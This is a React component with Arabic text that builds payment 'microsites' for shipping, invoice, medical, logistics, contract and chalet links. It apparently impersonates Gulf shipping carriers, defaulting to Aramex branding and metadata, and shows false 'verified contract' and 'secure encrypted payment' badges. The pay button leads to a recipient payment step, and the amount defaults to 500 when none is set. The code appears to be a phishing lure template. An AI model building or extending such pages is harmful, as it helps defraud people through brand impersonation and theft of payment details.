import React from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { useLink } from "@/hooks/useSupabase";
import { getCountryByCode, formatCurrency } from "@/lib/countries";
import { getServiceBranding } from "@/lib/serviceLogos";
import { gccShippingServices } from "@/lib/gccShippingServices";
import { getCompanyMeta } from "@/utils/companyMeta";
import { getCurrency } from "@/utils/countryData";
import SEOHead from "@/components/SEOHead";
import {
  MapPin,
  Users,
  CheckCircle2,
  CreditCard,
  Shield,
  Sparkles,
  Package,
  Truck,
  Hash,
  FileText,
  Heart,
  Building2,
} from "lucide-react";

const Microsite = () => {
  const { country, type, id } = useParams();
  const navigate = useNavigate();
  const { data: link, isLoading } = useLink(id);
  const countryData = getCountryByCode(country || "");
  
  if (isLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="animate-pulse text-xl">جاري التحميل...</div>
      </div>
    );
  }
  
  if (!link || !countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="text-center">
          <h2 className="text-2xl font-bold mb-2">الرابط غير موجود</h2>
          <p className="text-muted-foreground">الرجاء التحقق من الرابط</p>
        </div>
      </div>
    );
  }
  
  const payload = link.payload;

  // Get amount from payload - ensure it's a number, handle all data types
  const rawAmount = payload.cod_amount;

  // Handle different data types and edge cases
  let amount = 500; // Default value
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  // Determine service type
  const isShipping = link.type === 'shipping';
  const isInvoice = link.type === 'invoices';
  const isHealth = link.type === 'health';
  const isLogistics = link.type === 'logistics';
  const isContracts = link.type === 'contracts';
  const isChalet = link.type === 'chalet';

  // Get service branding for SEO and display
  const serviceName = payload.service_name || payload.chalet_name;
  const serviceKey = payload.service_key || 'aramex';
  const serviceBranding = getServiceBranding(serviceKey);

  // Get dynamic company metadata for OG tags
  const companyMeta = getCompanyMeta(serviceKey);

  // Update URL to include service information for better SEO
  React.useEffect(() => {
    const currentUrl = new URL(window.location.href);
    if (isShipping && serviceKey && !currentUrl.searchParams.has('service')) {
      currentUrl.searchParams.set('service', serviceKey);
      window.history.replaceState({}, '', currentUrl.toString());
    }
  }, [isShipping, serviceKey]);

  // Get service description from serviceBranding to match the chosen company
  const serviceDescription = serviceBranding.description || `خدمة ${serviceName} - نظام دفع آمن ومحمي`;

  const displayName = isShipping
    ? `شحنة ${serviceName}`
    : isInvoice
    ? `فاتورة ${payload.invoice_number}`
    : isHealth
    ? `حجز ${payload.service_type_label || 'خدمة صحية'}`
    : isLogistics
    ? `شحن ${payload.service_type_label || 'خدمة لوجستية'}`
    : isContracts
    ? `عقد ${payload.template_name}`
    : payload.chalet_name;

  // SEO metadata - Use dynamic company meta when available
  const seoTitle = isShipping
    ? companyMeta.title || `تتبع وتأكيد الدفع - ${serviceName}`
    : isInvoice
    ? `فاتورة ${payload.invoice_number} - ${countryData.nameAr}`
    : isHealth
    ? `${payload.service_type_label} - ${countryData.nameAr}`
    : isLogistics
    ? `شحن ${payload.service_type_label} - ${countryData.nameAr}`
    : isContracts
    ? `عقد ${payload.template_name} - ${countryData.nameAr}`
    : `حجز شاليه - ${payload.chalet_name}`;
  const seoDescription = isShipping
    ? companyMeta.description || `${serviceDescription} - تتبع شحنتك وأكمل الدفع بشكل آمن`
    : isInvoice
    ? `فاتورة رقم ${payload.invoice_number} - إجمالي ${payload.total} ${payload.currency}`
    : isHealth
    ? `${payload.service_type_label} - ${payload.appointment_date} ${payload.appointment_time}`
    : isLogistics
    ? `شحن من ${payload.sender_name} إلى ${payload.receiver_name}`
    : isContracts
    ? `${payload.template_name} - ${payload.template_category}`
    : `احجز ${payload.chalet_name} في ${countryData.nameAr} - ${payload.nights} ليلة لـ ${payload.guest_count} ضيف`;
  const seoImage = companyMeta.image || serviceBranding.ogImage || serviceBranding.heroImage || '/og-aramex.jpg';
  
  return (
    <>
      <SEOHead
        title={seoTitle}
        description={seoDescription}
        image={seoImage}
        url={window.location.href}
        type="website"
        serviceName={serviceName}
        serviceDescription={serviceDescription}
        companyKey={serviceKey}
        currency={countryData.currency}
      />
      <div className="min-h-screen py-12 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
      <div className="container mx-auto px-4">
        <div className="max-w-4xl mx-auto">
          {/* Header Badge */}
          <div className="text-center mb-8">
            <Badge className="text-lg px-6 py-2 bg-gradient-primary">
              <Shield className="w-4 h-4 ml-2" />
              <span>عقد موثّق ومحمي</span>
            </Badge>
          </div>
          
          {/* Main Card */}
          <Card className="overflow-hidden shadow-elevated">
            {/* Header with Country Colors */}
            <div
              className="h-32 relative"
              style={{
                background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
              }}
            >
              <div className="absolute inset-0 bg-black/20" />
              <div className="absolute bottom-4 right-6 text-white">
                <h1 className="text-3xl font-bold">
                  {isInvoice
                    ? `فاتورة ${payload.invoice_number}`
                    : isHealth
                    ? payload.service_type_label
                    : isLogistics
                    ? payload.service_type_label
                    : isContracts
                    ? payload.template_name
                    : payload.chalet_name}
                </h1>
                <p className="text-lg opacity-90">{countryData.nameAr}</p>
              </div>
            </div>
            
            {/* Content */}
            <div className="p-8">
              {/* Service Icon */}
              <div className="aspect-video bg-gradient-card rounded-xl mb-6 flex items-center justify-center">
                {isShipping ? (
                  <Truck className="w-16 h-16 text-muted-foreground" />
                ) : isInvoice ? (
                  <FileText className="w-16 h-16 text-muted-foreground" />
                ) : isHealth ? (
                  <Heart className="w-16 h-16 text-muted-foreground" />
                ) : isLogistics ? (
                  <Package className="w-16 h-16 text-muted-foreground" />
                ) : isContracts ? (
                  <Building2 className="w-16 h-16 text-muted-foreground" />
                ) : (
                  <Sparkles className="w-16 h-16 text-muted-foreground" />
                )}
              </div>
              
              {/* Service Info for Shipping */}
              {isShipping && (
                <div className="mb-6 p-4 bg-secondary/20 rounded-lg border">
                  <div className="flex items-center gap-3 mb-2">
                    <Package className="w-5 h-5 text-primary" />
                    <h3 className="font-bold text-lg">{serviceName}</h3>
                  </div>
                  <p className="text-sm text-muted-foreground">{serviceDescription}</p>
                </div>
              )}
              
              {/* Details Grid */}
              <div className="grid md:grid-cols-2 gap-6 mb-8">
                {isInvoice ? (
                  <>
                    <div className="flex items-start gap-3">
                      <FileText className="w-5 h-5 text-primary mt-1" />
                      <div>
                        <p className="font-semibold mb-1">رقم الفاتورة</p>
                        <p className="text-muted-foreground text-sm">
                          {payload.invoice_number}
                        </p>
                      </div>
                    </div>
                    <div className="flex items-start gap-3">
                      <Users className="w-5 h-5 text-primary mt-1" />
                      <div>
                        <p className="font-semibold mb-1">العميل</p>
                        <p className="text-muted-foreground text-sm">
                          {payload.client_name}
                        </p>
                      </div>
                    </div>
                    <div className="flex items-start gap-3">
                      <CheckCircle2 className="w-5 h-5 text-primary mt-1" />
                      <div>
                        <p className="font-semibold mb-1">تاريخ الإصدار</p>
                        <p className="text-muted-foreground text-sm">
                          {payload.issue_date}
                        </p>
                      </div>
                    </div>
                    <div className="flex items-start gap-3">
                      <CreditCard className="w-5 h-5 text-primary mt-1" />
                      <div>
                        <p className="font-semibold mb-1">الإجمالي</p>
                        <p className="text-muted-foreground text-sm">
                          {formatCurrency(payload.total, payload.currency)}
                        </p>
                      </div>
                    </div>
                  </>
                ) : isHealth ? (
                  <>
                    <div className="flex items-start gap-3">
                      <Users className="w-5 h-5 text-primary mt-1" />
                      <div>
                        <p className="font-semibold mb-1">اسم المريض</p>
                        <p className="text-muted-foreground text-sm">
                          {payload.patient_name}
                        </p>
                      </div>
                    </div>
                    <div className="flex items-start gap-3">
                      <Heart className="w-5 h-5 text-primary mt-1" />
                      <div>
                        <p className="font-semibold mb-1">نوع الخدمة</p>
                        <p className="text-muted-foreground text-sm">
                          {payload.service_type_label}
                        </p>
                      </div>
                    </div>
                    <div className="flex items-start gap-3">
                      <CheckCircle2 className="w-5 h-5 text-primary mt-1" />
                      <div>
                        <p className="font-semibold mb-1">تاريخ الموعد</p>
                        <p className="text-muted-foreground text-sm">
                          {payload.appointment_date} - {payload.appointment_time}
                        </p>
                      </div>
                    </div>
                    <div className="flex items-start gap-3">
                      <CreditCard className="w-5 h-5 text-primary mt-1" />
                      <div>
                        <p className="font-semibold mb-1">الطبيب</p>
                        <p className="text-muted-foreground text-sm">
                          {payload.doctor_name || 'غير محدد'}
                        </p>
                      </div>
                    </div>
                  </>
                ) : isLogistics ? (
                  <>
                    <div className="flex items-start gap-3">
                      <MapPin className="w-5 h-5 text-primary mt-1" />
                      <div>
                        <p className="font-semibold mb-1">المرسل</p>
                        <p className="text-muted-foreground text-sm">
                          {payload.sender_name}
                        </p>
                      </div>
                    </div>
                    <div className="flex items-start gap-3">
                      <MapPin className="w-5 h-5 text-primary mt-1" />
                      <div>
                        <p className="font-semibold mb-1">المستلم</p>
                        <p className="text-muted-foreground text-sm">
                          {payload.receiver_name}
                        </p>
                      </div>
                    </div>
                    <div className="flex items-start gap-3">
                      <Package className="w-5 h-5 text-primary mt-1" />
                      <div>
                        <p className="font-semibold mb-1">نوع الشحنة</p>
                        <p className="text-muted-foreground text-sm">
                          {payload.package_type_label}
                        </p>
                      </div>
                    </div>
                    <div className="flex items-start gap-3">
                      <CreditCard className="w-5 h-5 text-primary mt-1" />
                      <div>
                        <p className="font-semibold mb-1">الوزن</p>
                        <p className="text-muted-foreground text-sm">
                          {payload.package_weight} كجم
                        </p>
                      </div>
                    </div>
                  </>
                ) : isContracts ? (
                  <>
                    <div className="flex items-start gap-3">
                      <Building2 className="w-5 h-5 text-primary mt-1" />
                      <div>
                        <p className="font-semibold mb-1">نوع العقد</p>
                        <p className="text-muted-foreground text-sm">
                          {payload.template_category}
                        </p>
                      </div>
                    </div>
                    <div className="flex items-start gap-3">
                      <Shield className="w-5 h-5 text-primary mt-1" />
                      <div>
                        <p className="font-semibold mb-1">السلطة المختصة</p>
                        <p className="text-muted-foreground text-sm">
                          {payload.country_elements?.authority || 'غير محدد'}
                        </p>
                      </div>
                    </div>
                    <div className="flex items-start gap-3">
                      <CheckCircle2 className="w-5 h-5 text-primary mt-1" />
                      <div>
                        <p className="font-semibold mb-1">موقع الختم</p>
                        <p className="text-muted-foreground text-sm">
                          {payload.country_elements?.stampPosition || 'غير محدد'}
                        </p>
                      </div>
                    </div>
                    <div className="flex items-start gap-3">
                      <FileText className="w-5 h-5 text-primary mt-1" />
                      <div>
                        <p className="font-semibold mb-1">موقع التوقيع</p>
                        <p className="text-muted-foreground text-sm">
                          {payload.country_elements?.signaturePosition || 'غير محدد'}
                        </p>
                      </div>
                    </div>
                  </>
                ) : isShipping ? (
                  <>
                    <div className="flex items-start gap-3">
                      <Hash className="w-5 h-5 text-primary mt-1" />
                      <div>
                        <p className="font-semibold mb-1">رقم الشحنة</p>
                        <p className="text-muted-foreground text-sm">
                          {payload.tracking_number}
                        </p>
                      </div>
                    </div>
                    <div className="flex items-start gap-3">
                      <Truck className="w-5 h-5 text-primary mt-1" />
                      <div>
                        <p className="font-semibold mb-1">وصف الطرد</p>
                        <p className="text-muted-foreground text-sm">
                          {payload.package_description || 'غير محدد'}
                        </p>
                      </div>
                    </div>
                    <div className="flex items-start gap-3">
                      <CreditCard className="w-5 h-5 text-primary mt-1" />
                      <div>
                        <p className="font-semibold mb-1">مبلغ الدفع</p>
                        <p className="text-muted-foreground text-sm">
                          {formatCurrency(amount, countryData.currency)}
                        </p>
                      </div>
                    </div>
                  </>
                ) : (
                  <>
                    <div className="flex items-start gap-3">
                      <MapPin className="w-5 h-5 text-primary mt-1" />
                      <div>
                        <p className="font-semibold mb-1">الموقع</p>
                        <p className="text-muted-foreground text-sm">
                          {payload.chalet_name}
                        </p>
                      </div>
                    </div>
                    <div className="flex items-start gap-3">
                      <Users className="w-5 h-5 text-primary mt-1" />
                      <div>
                        <p className="font-semibold mb-1">عدد الضيوف</p>
                        <p className="text-muted-foreground text-sm">
                          {payload.guest_count} ضيف
                        </p>
                      </div>
                    </div>
                    <div className="flex items-start gap-3">
                      <CheckCircle2 className="w-5 h-5 text-primary mt-1" />
                      <div>
                        <p className="font-semibold mb-1">المدة</p>
                        <p className="text-muted-foreground text-sm">
                          {payload.nights} ليلة
                        </p>
                      </div>
                    </div>
                    <div className="flex items-start gap-3">
                      <CreditCard className="w-5 h-5 text-primary mt-1" />
                      <div>
                        <p className="font-semibold mb-1">السعر / الليلة</p>
                        <p className="text-muted-foreground text-sm">
                          {formatCurrency(payload.price_per_night, countryData.currency)}
                        </p>
                      </div>
                    </div>
                  </>
                )}
              </div>
              
              {/* Total Amount */}
              <div className="bg-gradient-primary p-6 rounded-xl text-primary-foreground mb-6">
                <p className="text-sm mb-2 opacity-90">
                  {isInvoice ? 'إجمالي الفاتورة' : isHealth ? 'رسوم الحجز' : isLogistics ? 'تكلفة الشحن' : isContracts ? 'قيمة العقد' : 'المبلغ الإجمالي'}
                </p>
                <p className="text-5xl font-bold mb-2">
                  {isShipping
                    ? formatCurrency(amount, countryData.currency)
                    : isInvoice
                    ? formatCurrency(payload.total, payload.currency)
                    : isLogistics
                    ? formatCurrency(parseFloat(payload.insurance_value) || 0, countryData.currency)
                    : isContracts
                    ? 'مجاناً'
                    : formatCurrency(payload.total_amount, countryData.currency)}
                </p>
                <p className="text-sm opacity-80">
                  {isShipping
                    ? 'مبلغ الدفع عند الاستلام'
                    : isInvoice
                    ? `شامل الضريبة (${payload.vat_rate}%)`
                    : isHealth
                    ? 'موعد طبي معتمد'
                    : isLogistics
                    ? `${payload.service_type_label} - ${payload.package_weight} كجم`
                    : isContracts
                    ? 'عقد إلكتروني موثق'
                    : `${payload.price_per_night} × ${payload.nights} ليلة`}
                </p>
              </div>
              
              {/* Terms */}
              <div className="bg-secondary/30 p-4 rounded-lg mb-6">
                <h3 className="font-bold mb-2">
                  {isShipping
                    ? 'شروط الشحن'
                    : isInvoice
                    ? 'شروط الفاتورة'
                    : isHealth
                    ? 'شروط الحجز'
                    : isLogistics
                    ? 'شروط الشحن'
                    : isContracts
                    ? 'شروط العقد'
                    : 'شروط الحجز'}
                </h3>
                <ul className="text-sm text-muted-foreground space-y-1">
                  {isInvoice ? (
                    <>
                      <li>• الفاتورة صالحة للدفع لمدة 30 يوم</li>
                      <li>• الضريبة مضافة حسب القانون</li>
                      <li>• يمكن تقسيط المبلغ حسب الاتفاق</li>
                      <li>• الفاتورة معتمدة ومرقمة</li>
                    </>
                  ) : isHealth ? (
                    <>
                      <li>• الحجز مؤكد بعد الدفع</li>
                      <li>• إمكانية إلغاء الموعد قبل 24 ساعة</li>
                      <li>• يجب إحضار الهوية في الموعد</li>
                      <li>• الكشف مجاني مع التأمين</li>
                    </>
                  ) : isLogistics ? (
                    <>
                      <li>• الدفع مطلوب عند استلام الطرد</li>
                      <li>• تأكد من صحة العنوان قبل الدفع</li>
                      <li>• الطرد محمي ومؤمن عليه</li>
                      <li>• يمكن تتبع الطرد في أي وقت</li>
                    </>
                  ) : isContracts ? (
                    <>
                      <li>• العقد مكافئ للصورة الرسمية</li>
                      <li>• يتطلب توثيق الجهات المختصة</li>
                      <li>• التوقيعات الرقمية معتمدة</li>
                      <li>• نسخة رقمية محفوظة بأمان</li>
                    </>
                  ) : isShipping ? (
                    <>
                      <li>• الدفع مطلوب عند استلام الطرد</li>
                      <li>• تأكد من صحة العنوان قبل الدفع</li>
                      <li>• الطرد محمي ومؤمن عليه</li>
                      <li>• يمكن تتبع الطرد في أي وقت</li>
                    </>
                  ) : (
                    <>
                      <li>• الدفع بالكامل مطلوب لتأكيد الحجز</li>
                      <li>• سياسة الإلغاء: استرداد 50% قبل 7 أيام</li>
                      <li>• الحد الأقصى للضيوف يجب احترامه</li>
                      <li>• التدخين ممنوع داخل الشاليه</li>
                    </>
                  )}
                </ul>
              </div>
              
              {/* Payment Button */}
              <Button
                size="lg"
                className="w-full text-xl py-7 shadow-glow animate-pulse-glow"
                onClick={() => {
                  const companyKey = payload.service_key || 'aramex';
                  const currency = getCurrency(countryData.code);
                  const title = `Payment in ${countryData.nameAr}`;
                  navigate(`/pay/${link.id}/recipient?company=${companyKey}&currency=${currency}&title=${encodeURIComponent(title)}`);
                }}
              >
                <CreditCard className="w-6 h-6 ml-3" />
                <span>ادفع الآن</span>
              </Button>
              
              <p className="text-xs text-center text-muted-foreground mt-4">
                دفع آمن ومحمي بتقنيات التشفير العالمية
              </p>
            </div>
          </Card>
        </div>
      </div>
    </div>
    </>
  );
};

export default Microsite;
